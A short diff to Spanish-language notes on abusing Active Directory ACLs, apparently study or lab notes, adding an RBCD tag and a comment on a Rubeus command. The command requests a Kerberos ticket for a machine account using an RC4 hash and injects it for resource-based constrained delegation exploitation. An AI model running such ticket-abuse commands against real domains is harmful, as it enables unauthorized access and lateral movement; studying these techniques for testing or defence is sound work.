@@ -1,6 +1,6 @@
 # Abuso ACL 
 
-Tags: #AD #ACL #Windows 
+Tags: #AD #ACL #Windows #RBCD 
 
 ## GenericWrite sobre Computador
 
@@ -35,7 +35,7 @@ NOTA
 
 ## Explotación  RBCD 
 ```powershell 
-# Importar el ticket
+# Importar el ticket (Depende si se necesita ser la cuenta de máquina para poder hacer el ataque)
 ❯ Rubeus.exe asktgt /user:studvm$ /rc4:c48ea647156d946bc135515eaa0c954b /domain:domain.corp /ptt
 ```
 
